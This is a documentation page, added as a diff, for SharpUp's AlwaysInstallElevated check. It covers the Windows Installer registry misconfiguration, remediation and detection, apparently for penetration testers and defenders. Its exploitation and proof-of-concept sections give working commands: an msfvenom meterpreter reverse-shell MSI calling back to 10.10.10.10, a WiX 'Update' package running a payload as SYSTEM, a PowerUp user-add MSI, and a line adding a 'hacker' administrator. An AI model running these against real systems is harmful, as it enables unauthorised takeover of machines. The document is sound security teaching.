@@ -1,0 +1,309 @@
+---
+title: 'AlwaysInstallElevated'
+description: 'MSI packages installed with SYSTEM privileges'
+icon: 'box'
+---
+
+## Overview
+
+The AlwaysInstallElevated check identifies a Windows Group Policy misconfiguration that allows standard users to install MSI packages with SYSTEM-level privileges. This setting, when enabled in both HKEY_LOCAL_MACHINE and HKEY_CURRENT_USER, allows any user to execute arbitrary code with elevated privileges by creating a malicious MSI installer.
+
+<Warning>
+This is a critical privilege escalation vulnerability when both registry keys are set to 1.
+</Warning>
+
+## How It Works
+
+SharpUp checks two specific registry locations:
+
+```
+HKLM:\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+HKCU:\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+```
+
+**Vulnerability Condition:** Both values must be set to `1` for the vulnerability to be exploitable.
+
+### Technical Details
+
+The check performs the following operations:
+
+1. Queries `HKLM` for the AlwaysInstallElevated value
+2. Queries `HKCU` for the AlwaysInstallElevated value
+3. Reports if either or both values are set to `1`
+4. If both are `1`, the system is vulnerable
+
+## Example Output
+
+```
+=== Always Install Elevated ===
+    HKCU: 1
+    HKLM: 1
+```
+
+**Interpretation:**
+- Both registry keys are set to 1
+- Any user can install MSI packages with SYSTEM privileges
+- Immediate privilege escalation opportunity
+
+## Exploitation
+
+### Method 1: MSI Package with Metasploit
+
+```bash
+# Generate malicious MSI
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o malicious.msi
+
+# Transfer to target and install
+msiexec /quiet /qn /i C:\temp\malicious.msi
+```
+
+The MSI will execute with SYSTEM privileges regardless of the user's privileges.
+
+### Method 2: MSI Package with Custom Payload
+
+```powershell
+# Create MSI that adds user to administrators
+# Using WiX Toolset or similar MSI creation tool
+
+# Simple example using msiexec with custom action
+msiexec /i payload.msi /quiet
+```
+
+### Method 3: PowerShell MSI Creation
+
+```powershell
+# Create simple MSI with embedded executable
+$wixCode = @"
+<?xml version="1.0"?>
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+  <Product Id="*" UpgradeCode="12345678-1234-1234-1234-123456789012"
+           Name="Update" Version="1.0.0.0" Manufacturer="Corp" Language="1033">
+    <Package InstallerVersion="200" Compressed="yes" Comments="Update"/>
+    <Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
+    <Directory Id="TARGETDIR" Name="SourceDir">
+      <Directory Id="ProgramFilesFolder">
+        <Directory Id="INSTALLDIR" Name="Update">
+          <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-123456789013">
+            <File Id="ApplicationFile1" Source="payload.exe"/>
+          </Component>
+        </Directory>
+      </Directory>
+    </Directory>
+    <Feature Id="DefaultFeature" Level="1">
+      <ComponentRef Id="ApplicationFiles"/>
+    </Feature>
+    <CustomAction Id="RunApplication" FileKey="ApplicationFile1"
+                  ExeCommand="" Execute="deferred" Impersonate="no" Return="ignore"/>
+    <InstallExecuteSequence>
+      <Custom Action="RunApplication" After="InstallFiles"/>
+    </InstallExecuteSequence>
+  </Product>
+</Wix>
+"@
+
+# Compile with WiX toolset
+candle.exe update.wxs
+light.exe update.wixobj
+
+# Install
+msiexec /i update.msi /quiet
+```
+
+### Method 4: Using PowerUp (PowerShell)
+
+```powershell
+# Using PowerUp module
+Import-Module PowerUp.ps1
+Write-UserAddMSI
+
+# Install generated MSI
+msiexec /quiet /qn /i UserAdd.msi
+```
+
+## Remediation
+
+<Steps>
+  <Step title="Check Current Setting">
+    ```powershell
+    # Check if vulnerability exists
+    Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
+    Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
+    ```
+  </Step>
+
+  <Step title="Disable via Registry">
+    ```powershell
+    # Set to 0 or remove the values
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 0
+    Set-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 0
+
+    # Or remove completely
+    Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
+    Remove-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
+    ```
+  </Step>
+
+  <Step title="Disable via Group Policy">
+    If configured via GPO (recommended for domains):
+
+    1. Open Group Policy Management Console
+    2. Navigate to: **Computer Configuration → Administrative Templates → Windows Components → Windows Installer**
+    3. Set "Always install with elevated privileges" to **Disabled**
+    4. Run `gpupdate /force` on affected systems
+  </Step>
+
+  <Step title="Verify Fix">
+    ```bash
+    # Re-run check
+    SharpUp.exe AlwaysInstallElevated
+    ```
+
+    Should return no vulnerabilities.
+  </Step>
+</Steps>
+
+### Impact of Remediation
+
+After disabling this setting:
+- Standard users will need administrator privileges to install MSI packages requiring elevation
+- Software deployment may require administrator intervention
+- Use proper software deployment methods (SCCM, Intune, GPO) for enterprise environments
+
+## Detection
+
+### Defensive Monitoring
+
+Monitor for suspicious MSI installations:
+
+```powershell
+# Enable MSI installer logging
+reg add "HKLM\Software\Policies\Microsoft\Windows\Installer" /v Logging /t REG_SZ /d "voicewarmup" /f
+
+# Monitor Event Logs
+# Event ID 1033, 1034 in Application log for MSI installs
+Get-WinEvent -FilterHashtable @{LogName='Application'; ID=1033,1034} |
+    Where-Object {$_.TimeCreated -gt (Get-Date).AddHours(-24)}
+```
+
+### Detection Strategies
+
+<Tabs>
+  <Tab title="Registry Monitoring">
+    Monitor changes to AlwaysInstallElevated registry keys:
+    - Alert on any value set to 1
+    - Monitor both HKLM and HKCU hives
+    - Track who made the change
+  </Tab>
+
+  <Tab title="MSI Installation Monitoring">
+    Monitor MSI installations by non-admin users:
+    - Track msiexec.exe executions
+    - Alert on MSI installs with /quiet or /qn flags
+    - Log all MSI package sources
+  </Tab>
+
+  <Tab title="Process Monitoring">
+    Monitor for privilege escalation patterns:
+    - msiexec.exe spawning cmd.exe or powershell.exe
+    - Child processes of msiexec running as SYSTEM
+    - Unusual network connections from msiexec
+  </Tab>
+
+  <Tab title="File System Monitoring">
+    Monitor for malicious MSI files:
+    - MSI files in unusual locations (temp directories, user folders)
+    - MSI files downloaded from internet
+    - MSI files with suspicious names
+  </Tab>
+</Tabs>
+
+## Real-World Scenarios
+
+<AccordionGroup>
+  <Accordion title="Scenario 1: Legacy Software Deployment">
+    **Context:** Organization enabled AlwaysInstallElevated to allow users to install approved software packages.
+
+    **Risk:** Any user can now install any MSI, including malicious ones.
+
+    **Solution:**
+    - Use SCCM, Intune, or other deployment tools
+    - Implement AppLocker to whitelist approved MSI packages
+    - Disable AlwaysInstallElevated immediately
+  </Accordion>
+
+  <Accordion title="Scenario 2: Developer Workstations">
+    **Context:** Developers need to install various tools and packages frequently.
+
+    **Risk:** Developers can accidentally or intentionally escalate privileges.
+
+    **Solution:**
+    - Provide developers with separate admin accounts
+    - Use privilege escalation tools like gsudo or RunAs
+    - Don't enable AlwaysInstallElevated even for developers
+  </Accordion>
+
+  <Accordion title="Scenario 3: Penetration Testing">
+    **Context:** During a penetration test, standard user access is obtained.
+
+    **Attack Path:**
+    1. Run SharpUp to identify AlwaysInstallElevated
+    2. Generate malicious MSI with reverse shell
+    3. Install MSI to get SYSTEM shell
+    4. Complete objectives with elevated access
+  </Accordion>
+</AccordionGroup>
+
+## Proof of Concept
+
+### Simple Privilege Escalation PoC
+
+```powershell
+# Check if vulnerable
+$hklm = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
+$hkcu = Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
+
+if ($hklm.AlwaysInstallElevated -eq 1 -and $hkcu.AlwaysInstallElevated -eq 1) {
+    Write-Host "[+] System is vulnerable to AlwaysInstallElevated"
+
+    # Create simple MSI that runs command
+    # (Requires WiX toolkit or use msfvenom)
+
+    # Generate with msfvenom
+    # msfvenom -p windows/exec CMD="net user hacker P@ssw0rd /add && net localgroup administrators hacker /add" -f msi -o priv.msi
+
+    # Install MSI
+    # msiexec /quiet /qn /i priv.msi
+
+    Write-Host "[+] Create malicious MSI and run: msiexec /quiet /qn /i malicious.msi"
+} else {
+    Write-Host "[-] System is not vulnerable"
+}
+```
+
+## Related Checks
+
+<CardGroup cols={2}>
+  <Card title="Registry Autoruns" icon="list" href="/ghostpack-docs/SharpUp-mdx/checks/registryautoruns">
+    Check for modifiable autorun registry entries
+  </Card>
+  <Card title="Modifiable Services" icon="gear" href="/ghostpack-docs/SharpUp-mdx/checks/modifiableservices">
+    Identify services with weak permissions
+  </Card>
+  <Card title="Token Privileges" icon="id-card" href="/ghostpack-docs/SharpUp-mdx/checks/tokenprivileges">
+    Enumerate dangerous token privileges
+  </Card>
+  <Card title="Remediation Guide" icon="shield" href="/ghostpack-docs/SharpUp-mdx/remediation">
+    Comprehensive remediation guidance
+  </Card>
+</CardGroup>
+
+## References
+
+<CardGroup cols={2}>
+  <Card title="Microsoft Docs" icon="book" href="https://docs.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated">
+    Official documentation for AlwaysInstallElevated
+  </Card>
+  <Card title="MITRE ATT&CK" icon="book" href="https://attack.mitre.org/techniques/T1548/002/">
+    T1548.002 - Abuse Elevation Control Mechanism: Bypass User Account Control
+  </Card>
+</CardGroup>
